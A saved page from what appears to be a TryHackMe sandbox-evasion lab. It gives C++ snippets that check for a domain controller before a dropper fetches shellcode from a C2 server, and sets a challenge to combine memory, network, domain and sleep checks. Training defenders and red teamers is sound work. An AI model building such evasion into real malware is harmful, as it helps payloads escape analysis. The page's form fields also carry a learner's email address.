+</span><p><span>In our unmodified, original code, we can see the <a class="Mp4dB8Ad glossary-term" onclick="initPopOver(&#39;HTTP&#39;, &#39;Mp4dB8Ad&#39;)">HTTP</a> GET Request to go out to an AWS Web Server to get Stage two.</span></p><span style="font-size:16px">
+</span><p style="text-align:center"><img src="./TryHackMe _ Sandbox Evasion_files/1fb4c21ee81b9a5f979dba972c6e08ee.png" style="width:917.464px;height:464.507px"></p><span style="font-size:16px">
+</span><p style="text-align:center"><i><span>Screenshot from Any.Run showing an outbound <a class="fXBRkuAy glossary-term" onclick="initPopOver(&#39;HTTP&#39;, &#39;fXBRkuAy&#39;)">HTTP</a> Request</span></i></p><span style="font-size:16px">
+</span><p style="text-align:left">This shows that our code functions as intended! We can now move on to one of our final bypass categories - Querying Network Information.</p><span style="font-size:16px">
+</span><p><span style="font-size:24px">Querying Network Information</span></p><span style="font-size:16px">
+</span><p>For our last evasion technique, we will be querying information about the Active Directory domain. We will be keeping it simple by querying the name of a Domain Controller using the <a href="https://docs.microsoft.com/en-us/windows/win32/api/lmaccess/nf-lmaccess-netgetdcname" target="_blank">NetGetDCName </a><span>Windows API. This is a relatively simple Windows API that fetches the primary domain controller within the environment. This requires us to specify a pointer to a string for the <a class="K6HxIAYE glossary-term" onclick="initPopOver(&#39;DC&#39;, &#39;K6HxIAYE&#39;)">DC</a> Name to be put into. Implementing the function in C++ looks like so:</span></p><pre class=" language-cpp" tabindex="0"><code class=" language-cpp">BOOL <span class="token function">isDomainController</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+<span class="token comment"><span>// Create a long pointer to Wide String for our <a class="tyrxTTFF glossary-term" onclick="initPopOver(&#39;DC&#39;, &#39;tyrxTTFF&#39;)">DC</a> Name to live in</span></span>
+    LPCWSTR dcName<span class="token punctuation">;</span>  
+<span class="token comment">// Query the NetGetDCName Win32 API for the Domain Controller Name</span>
+    <span class="token function">NetGetDCName</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>LPBYTE <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>dcName<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment">// Convert the DCName from a Wide String to a String</span>
+    wstring <span class="token function">ws</span><span class="token punctuation">(</span>dcName<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    string <span class="token function">dcNewName</span><span class="token punctuation">(</span>ws<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ws<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment">// Search if the UNC path is referenced in the dcNewName variable. If so, there is likely a Domain Controller present in the environment. If this is true, pass the check, else, fail.</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span> dcNewName<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token string">"\\\\"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+          <span class="token keyword">return</span> TRUE<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+          <span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span> </code></pre><p><span style="font-size:1rem">This code can be broken down into the following steps:</span></p><ol><li><span style="font-family:Ubuntu">Declare two variables; one string, one LPCWSTR. The NetGetDCName WinAPI returns only an LPCWSTR.</span></li><li><span style="font-family:Ubuntu">Invoke the NetGetDCName Windows API. Two null values will be specified because we do not know the Server Name or the Domain Name of the environment we may be in</span></li><li><span style="font-family:Ubuntu">We convert the LPCWSTR to a normal string variable to check and see if the value is NULL (or, in the case of a string, "").</span></li><li><span style="font-family:Ubuntu">Execute the comparison statement and return True or False depending on the device name.</span></li></ol><br><span style="font-size:16px"><span>This will then call back to the Main() function which will then evaluate if it needs to download and execute our shellcode from the <a class="gA4oOn7R glossary-term" onclick="initPopOver(&#39;C2&#39;, &#39;gA4oOn7R&#39;)">C2</a> Server. The Main function now looks like so:</span></span><p></p><pre class=" language-cpp" tabindex="0"><code class=" language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>isDomainController <span class="token operator">==</span> TRUE<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token function">downloadAndExecute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Domain Controller Not Found!"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span> </code></pre><p><span style="font-family:Ubuntu"><span style="font-size:16px"></span></span></p><div><span style="font-size:16px">
+   </span><span style="font-weight:bold;font-family:Ubuntu;font-size:16px"><br>Testing our Code<br></span><span style="font-size:16px">For our last Sandbox analysis, we will be using VirusTotal. Looking at the results of the SysInternals Sandbox, we can see that our Sandbox evasion technique worked. No outbound request to Cloudflare was made.&nbsp;</span></div><div><br>
+   <div style="text-align:center"><img src="./TryHackMe _ Sandbox Evasion_files/be3ab6bfe807a0151ae966bf46b5084c.png"></div><div style="text-align:center"><i><span>The Screenshot above shows that our malware did not reach out to our <a class="kTr49N2F glossary-term" onclick="initPopOver(&#39;C2&#39;, &#39;kTr49N2F&#39;)">C2</a> Server.</span></i></div>
+   <div style="text-align:center"><br></div>
+   <div style="text-align:center"><img src="./TryHackMe _ Sandbox Evasion_files/792c6e1f9369ec2b0cb73f712a793bc3.png"><br><i><span>The Screenshot above shows that our malware reached out to our <a class="SE5rti6p glossary-term" onclick="initPopOver(&#39;C2&#39;, &#39;SE5rti6p&#39;)">C2</a> Server for the second stage.</span></i></div><div style="text-align:center"><i><br></i></div><div style="text-align:left;line-height:1.8"><div style="line-height:1.8"><span style="font-size:24px">Adding External Dependencies&nbsp;in Visual Studio</span></div><div></div></div><div style="text-align:left;line-height:1.8"><span>For the final evasion method, we must add a new <a class="nRzffDlc glossary-term" onclick="initPopOver(&#39;DLL&#39;, &#39;nRzffDlc&#39;)">DLL</a> to the project file. To do so, ensure your project is first opened. After it is opened, right-click on the Project name in the "Solution Explorer". In the image below, the Project name is called "Console Application2":</span></div><div style="text-align:center;line-height:1.8"><img src="./TryHackMe _ Sandbox Evasion_files/86020176cb2a5e8aed2e142d888cd3d4.png" style="width:320.521px;height:629.199px"></div><div style="text-align:left;line-height:1.8"><div style="text-align:left;line-height:1.8">Click Properties at the bottom of the list; this will open a new view. Expand the "Linker" tab and select the "Input" submenu. We are interested in adding the Netapi32 Library.</div><div style="text-align:center;line-height:1.8"><img src="./TryHackMe _ Sandbox Evasion_files/5c8865dcd04ae30c2fc6c41c42386484.png"><br></div><br>To do so, click on the right side with all of the libraries referenced and add Netapi32.lib. Once it is added (like in the screenshot depicted above), press the "Apply" button and "Ok" to close the window and you are ready to continue development!<div style="text-align:left;line-height:1.8"><br></div></div><div style="text-align:left;line-height:1.8"><span style="font-size:24px">Wrapping Up Implementations</span></div><div style="text-align:left"><div>Now that you are more familiar with implementing various Sandbox Evasion techniques, we will be moving on to a Sandbox evasion challenge in the next task.&nbsp;<span style="font-size:1rem">You will be required to integrate multiple bypasses together to evade the "Custom" TryHackMe Sandbox.&nbsp;</span><span style="font-size:1rem">All source code has been provided in full to help those out who may not be as familiar with C++.&nbsp;</span></div></div>
+</div><p></p></div>
+        </div>
+        
+        <div class="room-questions-split vertical-align-custom red">
+            <div>Answer the questions below</div>
+        </div>
+        
+                            <div class="room-task-questions">
+                            <div class="room-task-question-no vertical-align-custom">
+                                
+                            </div>
+                            <div class="room-task-question-details">
+                                Read about implementing various Sandbox evasion techniques.
+                            </div>
+                        </div>
+
+                    <div class="room-task-input">
+                        <div class="room-task-input-questions">
+                            <input type="text" class="form-control room-answer-field" placeholder="No answer needed" value="" disabled="">
+                            <input type="hidden" value="1">
+                            <input type="hidden" value="4">
+                        </div>
+                        <div class="room-task-input-answer">
+                            <button type="button" class="btn btn-outline-success task-answer" onclick="answerQuestion(this)">
+                            <i class="far fa-paper-plane"></i> Completed
+                        </button>
+                        </div>
+                        
+                    </div><div class="room-task-questions">
+                            <div class="room-task-question-no vertical-align-custom">
+                                
+                            </div>
+                            <div class="room-task-question-details">
+                                <p>Which evasion method involves reaching out to a host to identify your IP Address?</p>
+                            </div>
+                        </div>
+
+                    <div class="room-task-input">
+                        <div class="room-task-input-questions">
+                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: *********** *********" value="">
+                            <input type="hidden" value="2">
+                            <input type="hidden" value="4">
+                        </div>
+                        <div class="room-task-input-answer">
+                            <button type="button" class="btn btn-outline-success task-answer" onclick="answerQuestion(this)">
+                            <i class="far fa-paper-plane"></i> Submit
+                        </button>
+                        </div>
+                        
+                    </div><div class="room-task-questions">
+                            <div class="room-task-question-no vertical-align-custom">
+                                
+                            </div>
+                            <div class="room-task-question-details">
+                                <p>Which evasion technique involves burning compute-time to escape the sandbox?</p>
+                            </div>
+                        </div>
+
+                    <div class="room-task-input">
+                        <div class="room-task-input-questions">
+                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: ********" value="">
+                            <input type="hidden" value="3">
+                            <input type="hidden" value="4">
+                        </div>
+                        <div class="room-task-input-answer">
+                            <button type="button" class="btn btn-outline-success task-answer" onclick="answerQuestion(this)">
+                            <i class="far fa-paper-plane"></i> Submit
+                        </button>
+                        </div>
+                        
+                    </div>
+                        </div>
+                    </div>
+                </div><div class="card" id="task-5">
+                    <div class="card-header task-header" data-toggle="collapse" href="#collapse5">
+                        <a class="card-link">
+                            <span class="task-dropdown-title red">Task 5                             <span class="task-dropdown-icon"><i class="far fa-circle text-lgray"></i></span></span> DIY Sandbox Evasion Challenge
+                            <span class="float-right"><i class="fas fa-chevron-down"></i></span>
+                            <span class="task-resources"></span>
+                        </a>
+                    </div>
+                    <div id="collapse5" class="collapse show" data-parent="#taskContent">
+                        <div class="card-body task-incomplete">
+                            <div class="room-task-desc">
+            <div class="room-task-desc-data"> <p><span style="font-size:24px">The Great Escape</span></p><p>Now that you have gained some experience in escaping Sandboxes, it's time for a challenge! In this task, you will be utilizing the code from Task 4 to implement the "Ultimate Sandbox Evasion" method to escape TryHackMe's Sandbox program! In order to escape the Sandbox, you must implement the following techniques:</p><ul><li>Check and see if the device is joined to an Active Directory Domain</li><li>Check if the system memory is greater than 1GB of RAM</li><li><span>Implement an outbound <a class="s2KXJsNa glossary-term" onclick="initPopOver(&#39;HTTP&#39;, &#39;s2KXJsNa&#39;)">HTTP</a> request to 10.10.10.10</span></li><li>Implement a 60-second sleep timer before your payload is retrieved from your web server</li></ul><p>If your dropper meets these requirements specified above, the flag will be printed out to you.</p><p>Good luck and have fun!&nbsp;</p><p><i><span>As a reminder, Task 4 contains downloadable source code from the four examples that may assist you in your Sandbox Evasion techniques. This material can also be found on the <a class="q9Nyzyvl glossary-term" onclick="initPopOver(&#39;VM&#39;, &#39;q9Nyzyvl&#39;)">VM</a> at&nbsp;</span></i><code>C:\Users\Administrator\Desktop\Materials</code><i>.</i></p><p><i>The Sandbox Evasion Techniques <b>can </b>fail. The program analyzes the binary to see if the checks are implemented. The outbound device may not have internet access - as long as the checks are implemented, the sandbox check should succeed.&nbsp;</i></p><p><span style="font-size:24px">Sandbox Evasion Binary</span></p><p>When you are finished developing your payload and are ready to test your evasion methods,&nbsp; you can find the binary to check your dropper in <code>C:\Users\Administrator\Desktop\Materials\SandboxChecker.exe</code>. Below is an example to show you how the program works:&nbsp;<br></p>
+
+<p></p><div class="terminal-container">
+    <div class="terminal-content">
+        <div class="terminal-top">
+            THM Sandbox Binary Syntax
+        </div>
+        <pre class="terminal-code language-shell-session" tabindex="0">           <code class=" language-shell-session"><span class="token output">C:\Users\Administrator\Desktop\Materials\&gt; .\SandboxChecker.exe C:\Users\TryHackMe\Materials\SandboxEvasion.exe
+[+] Memory Check found!
+[+] Network Check found!
+[+] GeoFilter Check found!
+[+] Sleep Check found!
+Congratulations! Here is your flag:</span></code>
+        </pre>
+    </div>
+</div></div>
+        </div>
+        
+        <div class="room-questions-split vertical-align-custom red">
+            <div>Answer the questions below</div>
+        </div>
+        
+                            <div class="room-task-questions">
+                            <div class="room-task-question-no vertical-align-custom">
+                                
+                            </div>
+                            <div class="room-task-question-details">
+                                <p><span>Create your own Sandbox Evasion executable using the code snippets in the task and the <a class="3g5TZacc glossary-term" onclick="initPopOver(&#39;VM&#39;, &#39;3g5TZacc&#39;)">VM</a> as reference.</span></p><p>Run the "SandboxChecker.exe" in a command prompt (example above) providing your executable as the argument. All checks must be implemented correctly for the flag to reveal.</p><p> <b>Note:</b> If you have done it right, the "Sleep Check" will take approximately <b>one minute to reveal</b>&nbsp;the flag.<br><br><span style="font-weight:bolder">Note:&nbsp;</span><span style="font-size:1rem"><span>If your <a class="xs2o19O1 glossary-term" onclick="initPopOver(&#39;DNS&#39;, &#39;xs2o19O1&#39;)">DNS</a> check has&nbsp;</span></span><span style="background-color:rgb(234, 234, 237);color:rgb(196, 20, 20);font-family:SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size:14px">if(dcNewName.find("\\"))</span><span style="font-size:1rem">&nbsp;</span><span style="font-size:1rem">instead of&nbsp;</span><span style="background-color:rgb(234, 234, 237);color:rgb(196, 20, 20);font-family:SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size:14px">if(dcNewName.find("\\\\"))</span><span style="font-size:1rem">&nbsp;</span><span style="font-size:1rem">then you may have difficulties with the sleep check.</span></p>
+                            </div>
+                        </div>
+
+                    <div class="room-task-input">
+                        <div class="room-task-input-questions">
+                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: ***{********}" value="">
+                            <input type="hidden" value="1">
+                            <input type="hidden" value="5">
+                        </div>
+                        <div class="room-task-input-answer">
+                            <button type="button" class="btn btn-outline-success task-answer" onclick="answerQuestion(this)">
+                            <i class="far fa-paper-plane"></i> Submit
+                        </button>
+                        </div>
+                        <div class="room-task-input-hint">
+                            <button type="button" class="btn btn-outline-dorange btn-noline task-hint" onclick="getHint(this)">
+                        <i class="fal fa-lightbulb"></i> Hint
+                      </button>
+                        </div>
+                    </div>
+                        </div>
+                    </div>
+                </div><div class="card" id="task-6">
+                    <div class="card-header task-header" data-toggle="collapse" href="#collapse6">
+                        <a class="card-link">
+                            <span class="task-dropdown-title red">Task 6                             <span class="task-dropdown-icon"><i class="far fa-circle text-lgray"></i></span></span> Wrapping Up
+                            <span class="float-right"><i class="fas fa-chevron-down"></i></span>
+                            <span class="task-resources"></span>
+                        </a>
+                    </div>
+                    <div id="collapse6" class="collapse show" data-parent="#taskContent">
+                        <div class="card-body task-incomplete">
+                            <div class="room-task-desc">
+            <div class="room-task-desc-data"> <p><span style="font-size:24px">Wrapping Up</span></p><p>In this room, we covered some modern and historic&nbsp;<span style="font-size:1rem">Sandbox evasion techniques that have been used by both red teamers and advanced threat actors alike. After finishing up this room, you should now have a general understanding of what a malware sandbox is, methods that you could try to use to evade it, and even some template code that you can build off of.</span></p><p><span style="font-size:1rem">This is by no means a fully comprehensive list of all of the Sandbox Evasion methods out there; we highly encourage you to go out and develop your own Sandbox Evasion techniques with the foundational knowledge learned from this room.</span></p></div>
+        </div>
+        
+        <div class="room-questions-split vertical-align-custom red">
+            <div>Answer the questions below</div>
+        </div>
+        
+                            <div class="room-task-questions">
+                            <div class="room-task-question-no vertical-align-custom">
+                                
+                            </div>
+                            <div class="room-task-question-details">
+                                Read the closing task.
+                            </div>
+                        </div>
+
+                    <div class="room-task-input">
+                        <div class="room-task-input-questions">
+                            <input type="text" class="form-control room-answer-field" placeholder="No answer needed" value="" disabled="">
+                            <input type="hidden" value="1">
+                            <input type="hidden" value="6">
+                        </div>
+                        <div class="room-task-input-answer">
+                            <button type="button" class="btn btn-outline-success task-answer" onclick="answerQuestion(this)">
+                            <i class="far fa-paper-plane"></i> Completed
+                        </button>
+                        </div>
+                        
+                    </div>
+                        </div>
+                    </div>
+                </div></div>
+</div>
+<div id="room-simple-details"><div class="card cd-2 text-center mt-3"><div class="card-body"><p class="size-18">Created by <img class="avatar-tiny" src="./TryHackMe _ Sandbox Evasion_files/af7feb2c43a2c7d5f111b98ccbd15048.png"> 
+        <a class="green-link" href="https://tryhackme.com/p/tryhackme">tryhackme</a> and <img class="avatar-tiny" src="./TryHackMe _ Sandbox Evasion_files/900284253a6d48158be6dcbf6a9ed376.jpg"> 
+        <a class="green-link" href="https://tryhackme.com/p/cmnatic">cmnatic</a> and <img class="avatar-tiny" src="./TryHackMe _ Sandbox Evasion_files/9e946af210ae86d6fbfda480d958b3fe.gif"> 
+        <a class="green-link" href="https://tryhackme.com/p/Cryillic">Cryillic</a></p><p class="mb-0">Only subscribers can deploy virtual machines in this room! 
+        Go to your <a href="https://tryhackme.com/profile">profile</a> page to subscribe (if you have not already). 6765 users are in here and this room is 431 days old.</p></div></div></div>
+
+</div>
+</div>
+</div>
+<div id="room-content-attackbox">
+<div id="room-attackbox">
+<div id="attackbox-machine-instance">
+<div id="room-attackbox-loading"></div>
+<div id="room-attackbox-vm-view"></div>
+</div>
+<div id="attackbox-machine-options">
+<div class="d-flex">
+<a target="_blank" id="room-attackbox-url" data-toggle="tooltip" data-placement="top" title="" data-container="#room-content" data-original-title="View in full screen"></a>
+<div onclick="extendHourWebBasedVM(null)" class="hover-pointer" id="room-attackbox-extend" data-toggle="tooltip" data-placement="top" title="" data-container="#room-content" data-original-title="Extend machines timer"><i class="fas fa-plus"></i></div>
+<div onclick="terminateWebBasedVM(null)" class="hover-pointer" id="room-attackbox-terminate" data-toggle="tooltip" data-placement="top" title="" data-container="#room-content" data-original-title="Terminate Machine"><i class="far fa-power-off"></i></div>
+<div onclick="exitViewAttackBox()" class="hover-pointer" id="room-attackbox-exitview" data-toggle="tooltip" data-placement="top" title="" data-container="#room-content" data-original-title="Exit split view"><i class="fas fa-minus"></i></div>
+<div onclick="infoAttackBox()" class="hover-pointer faded" id="room-attackbox-info" data-toggle="tooltip" data-placement="top" title="" data-container="#room-content" data-original-title="Machine Information"><i class="fas fa-info"></i></div>
+<div class="d-flex" id="room-attackbox-tabs"></div>
+</div>
+<div id="room-attackbox-expire-text" data-toggle="tooltip" data-placement="top" title="" data-container="#room-content" data-original-title="Time left until your AttackBox expires"></div>
+</div>
+</div>
+<div class="modal fade" id="attackBoxInfoModal" tabindex="-1" role="dialog" aria-hidden="true">
+<div class="modal-dialog" role="document">
+<div class="modal-content">
+<div class="modal-header modal-light-gray">
+<h5 class="modal-title m-auto">Web-Based Machine Information</h5>
+</div>
+<div class="modal-body">
+<p>Use the web-based machine to attack other target machines you start on TryHackMe.</p>
+<ul class="normalList text-gray mt-3 mb-4">
+<li>Public IP: <code id="browser-machine-pubip" class="dark size-14"></code></li>
+<li class="mt-1">Private IP: <code id="browser-machine-privip" class="dark size-14"></code> <span class="size-14">(Use this for your reverse shells)</span></li>
+<li class="mt-1">Username: <code id="browser-username" class="dark size-14"></code></li>
+<li class="mt-1">Password: <code id="browser-password" class="dark size-14"></code></li>
+<li class="mt-1">Protocol: <code id="browser-protocol" class="dark size-14"></code></li>
+</ul>
+<hr class="hr-min">
+<ul class="text-lgray mb-0">
+<li class="mt-2">To copy to and from the browser-based machine, highlight the text and press <b>CTRL+SHIFT+C</b> <details><summary>or use the clipboard</summary><img src="./TryHackMe _ Sandbox Evasion_files/clipboard.gif"></details></li>
+<li class="mt-2">When accessing target machines you start on TryHackMe tasks, make sure you're using the correct IP (it <b>should not be</b> the IP of your AttackBox)</li>
+</ul>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="modal fade" id="award-modal" tabindex="-1" role="dialog" aria-hidden="true">
+<div class="modal-dialog" role="document">
+<div class="modal-content">
+<div class="modal-body text-center">
+<button type="button" class="close size-30 text-lgray" data-dismiss="modal" aria-label="Close">
+<span aria-hidden="true">×</span>
+</button>
+<div id="award-modal-badges"></div>
+<p class="mb-0 text-lgray size-18">Complete the room to earn this badge</p>
+</div>
+</div>
+</div>
+</div>
+<div class="modal fade" id="hint-modal" tabindex="-1" role="dialog" aria-hidden="true">
+<div class="modal-dialog" role="document">
+<div class="modal-content">
+<div class="modal-header modal-dark-blue">
+<h5 class="modal-title"><i class="fal fa-lightbulb-on"></i> Question Hint</h5>
+<button type="button" class="close" data-dismiss="modal" aria-label="Close">
+<span aria-hidden="true">×</span>
+</button>
+</div>
+<div class="modal-body"></div>
+</div>
+</div>
+</div>
+<div class="modal fade" id="modal" tabindex="-1" role="dialog" aria-hidden="true">
+<div class="modal-dialog" role="document">
+<div class="modal-content">
+<div class="modal-header">
+<h5 class="modal-title">...</h5>
+<button type="button" class="close" data-dismiss="modal" aria-label="Close">
+<span aria-hidden="true">×</span>
+</button>
+</div>
+<div class="modal-body text-center"></div>
+<div class="modal-footer"></div>
+</div>
+</div>
+</div>
+<link rel="stylesheet" href="./TryHackMe _ Sandbox Evasion_files/modal.css">
+<div class="modal-design-green modal fade" id="roomCompleted" tabindex="-1" role="dialog" data-backdrop="static" aria-hidden="true">
+<div class="modal-dialog modal-dialog-centered" role="document">
+<div class="modal-content" id="roomCompletedModalContent">
+<div class="modal-body text-center">
+<button type="button" class="close" id="closeRoomComplete" aria-label="Close">
+<i class="fad fa-times-circle"></i>
+</button>
+<div class="icon-box">
+<i class="fad fa-badge-check"></i>
+</div>
+<h3 class="text-accent mt-5">Congratulations</h3>
+<p class="faded mt-1">You've completed the room! Share this with your friends: </p>
+<h2 id="roomCompleted-share"></h2>
+<div id="ticket-info"></div> 
+<p class="faded mt-1" id="roomFeedbackBtn">
+<small>
+<button class="bg-white border-0">Leave
+feedback</button>
+</small>
+</p>
+<form method="post" action="https://tryhackme.com/feedback" id="roomFeedbackForm" class="d-none mt-3">
+<input type="hidden" name="_csrf" value="QbvgWhMd-59d-y4B6IMEs86a_gYXd72QUJYY">
+<input type="hidden" name="roomCode" value="sandboxevasion">
+<input type="hidden" name="type" value="rooms">
+<input type="hidden" name="redirect" value="json">
+<div class="form-group">
+<label class="mb-0" for="like">What do you like about the room?</label>
+<textarea type="text" name="like" id="like" class="form-control"></textarea>
+</div>
+<div class="form-group">
+<label class="mb-0" for="dislike">What don't you like about the room?</label>
+<textarea type="text" name="dislike" id="dislike" class="form-control"></textarea>
+</div>
+<div class="form-group">
+<label class="mb-0" for="details">Please send your suggestions, ideas and comments!</label>
+<textarea id="details" type="text" name="details" class="form-control" style="padding: 5px;"></textarea>
+</div>
+<button type="submit" id="submitBtn" class="btn btn-success">Send Feedback</button>
+</form>
+<p class="mt-2 mb-0" id="formMessage"></p>
+</div>
+</div>
+</div>
+<script>
+    function dismissRoomCompleteModal() {
+      $('#roomCompleted').modal('hide');
+
+      const shouldSeeReferralModal = ""
+      if (shouldSeeReferralModal) {
+        $('#unlockCreditModal').modal('show');
+
+        referralModalEvent('view');
+      }
+    }
+
+    document.getElementById('closeRoomComplete').addEventListener('click', dismissRoomCompleteModal)
+  </script>
+</div>
+<script src="./TryHackMe _ Sandbox Evasion_files/roomFeedback.js"></script>
+<div class="modal fade" id="roomStartAttackboxModal" tabindex="-1" role="dialog" aria-hidden="true" data-backdrop="static" data-keyboard="false">
+<div class="modal-dialog modal-dialog-centered" role="document">
+<div class="modal-content">
+<div class="modal-header modal-dark-blue">
+<h5 class="modal-title m-auto">To access this machine, you need to either</h5>
+<button type="button" class="close" data-dismiss="modal" aria-label="Close" style="position: absolute; right: 10px; top: 0; font-size: 30px;">
+<span aria-hidden="true">×</span>
+</button>
+</div>
+<div class="modal-body text-center">
+<div class="row vertical-align-custom mb-0">
+<div class="col-sm-5 pr-0">
+<p class="size-18 bold">Use a VPN</p>
+<p>Connect to our network via a VPN</p>
+<a target="_blank" href="https://tryhackme.com/access"><button type="button" class="btn btn-light">See Instructions</button></a>
+</div>
+<div class="col-sm-2 size-24">
+or
+</div>
+<div class="col-sm-5 pl-0">
+<p class="size-18 bold">Use the AttackBox</p>
+<p>Use a web-based attack machine <span class="size-12">(recommended)</span></p>
+<button type="button" onclick="$(&#39;#roomStartAttackboxModal&#39;).modal(&#39;toggle&#39;); startAttackBox({startingMsg: false, tutorial: true})" class="btn btn-hgreen">Start AttackBox</button>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="modal-design-green modal fade" id="expireSoon" tabindex="-1" role="dialog" aria-hidden="true">
+<div class="modal-dialog modal-dialog-centered modal-sm" role="document">
+<div class="modal-content">
+<div class="modal-body text-center">
+<h1><i class="text-warning fad fa-exclamation-triangle"></i></h1>
+<h3 class="text-warning">Expiring Soon</h3>
+<p class="faded mt-3 mb-0">Your machine is going to expire soon. Close this and add an hour to stop it from terminating!</p>
+</div>
+<div class="modal-footer">
+<button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
+</div>
+</div>
+</div>
+</div>
+<div class="modal-design-green modal fade" id="terminatedMachine" tabindex="-1" role="dialog" aria-hidden="true">
+<div class="modal-dialog modal-dialog-centered modal-sm" role="document">
+<div class="modal-content">
+<div class="modal-body text-center">
+<h1><i class="text-danger fad fa-exclamation-triangle"></i></h1>
+<h3 class="text-danger">Expired Machine</h3>
+<p class="faded mt-3 mb-0">Your machine has expired and terminated.</p>
+</div>
+<div class="modal-footer">
+<button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
+</div>
+</div>
+</div>
+</div>
+<div class="modal-design-green modal fade" id="machineDeployModal" tabindex="-1" role="dialog" aria-hidden="true">
+<div class="modal-dialog modal-dialog-centered modal-lg" role="document">
+<div class="modal-content">
+<div class="modal-header modal-dark-blue text-center p-3">
+<h4 class="mb-0 m-auto">How to access machines</h4>
+<button type="button" class="close modal-close" data-dismiss="modal" aria-label="Close">
+<span aria-hidden="true">×</span>
+</button>
+</div>
+<div class="modal-body text-center">
+<p class="size-18 faded">Now you've started your machine, to access it you need to either</p>
+<div class="row mb-0">
+<div class="col-sm-6">
+<img src="./TryHackMe _ Sandbox Evasion_files/connect_openvpn_short.png">
+<p class="mt-2 mb-0 faded">Download your VPN configuration file and import it into a OpenVPN client</p>
+</div>
+<div class="col-sm-6">
+<img src="./TryHackMe _ Sandbox Evasion_files/connect_kali_short.png">
+<p class="mt-2 mb-0 faded">Control a web-based machine with everything you need, all from inside your browser</p>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="modal fade" id="roomAlertModal" tabindex="-1" role="dialog" aria-hidden="true">
+<div class="modal-dialog modal-dialog-centered" role="document">
+<div class="modal-content">
+<div class="modal-header modal-dark-blue">
+<h5 class="modal-title" id="roomAlertModalTitle"></h5>
+<button type="button" class="close" data-dismiss="modal" aria-label="Close">
+<span aria-hidden="true">×</span>
+</button>
+</div>
+<div class="modal-body" id="roomAlertModalBody"></div>
+<div class="modal-footer">
+<button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
+</div>
+</div>
+</div>
+</div>
+<div class="modal fade" id="resetUserProgressModal" role="dialog">
+<div class="modal-dialog" role="document">
+<div class="modal-content">
+<div class="modal-header">
+<h5 class="modal-title">Reset Your Progress</h5>
+<button type="button" class="close" data-dismiss="modal" aria-label="Close">
+<span aria-hidden="true">×</span>
+</button>
+</div>
+<div class="modal-body">
+<div><span class="text-danger"><i class="fas fa-exclamation-triangle"></i> Warning</span> You will keep your points but all your answers in this room will be erased.</div>
+</div>
+<div class="modal-footer">
+<button type="button" class="btn btn-danger" onclick="resetProgress()">Yes, please!</button>
+</div>
+</div>
+</div>
+</div>
+<div class="modal fade" id="cloudEnvInfoModal" tabindex="-1" role="dialog" aria-hidden="true">
+<div class="modal-dialog modal-dialog-centered modal-lg" role="document">
+<div class="modal-content">
+<div class="modal-header  modal-dark-blue">
+<h5 class="modal-title">Cloud Information</h5>
+<button type="button" class="close" data-dismiss="modal" aria-label="Close">
+<span aria-hidden="true">×</span>
+</button>
+</div>
+<div class="modal-body">
+<ul class="nav nav-tabs">
+<li class="nav-item pr-2">
+<a class="nav-link active" data-toggle="tab" href="https://tryhackme.com/room/sandboxevasion#env-tab">Environment</a>
+</li>
+<li class="nav-item">
+<a class="nav-link" data-toggle="tab" href="https://tryhackme.com/room/sandboxevasion#creds-tab">Credentials</a>
+</li>
+</ul>
+<div class="tab-content">
+<div class="tab-pane active" id="env-tab"></div>
+<div class="tab-pane" id="creds-tab"></div>
+</div>
+</div>
+<div class="modal-footer" id="cloudEnvModalFooter">
+</div>
+</div>
+</div>
+</div>
+<div class="modal fade" id="setNameModal" role="dialog">
+<div class="modal-dialog modal-lg modal-dialog-centered" role="document">
+<div class="modal-content">
+<div class="modal-header modal-dark-blue">
+<h5 class="modal-title">Generating Your Certificate</h5>
+<button type="button" class="close" data-dismiss="modal" aria-label="Close">
+<span aria-hidden="true">×</span>
+</button>
+</div>
+<div class="modal-body container">
+<div class="row">
+<div class="col-6">
+<h5 class="bold">Hey there, what's your name?</h5>
+<p class="text-secondary">
+If you want your name to appear on your certificate, please fill the field below.
+</p>
+<div class="form-group">
+<label>Full Name </label>
+<input id="modal-cert-field-name" type="text" placeholder="John Wick" class="mb-4 form-control">
+<input id="modal-cert-field-email" type="hidden" value="giftonpaul@karunya.edu.in">
+</div>
+</div>
+<div class="col-6">
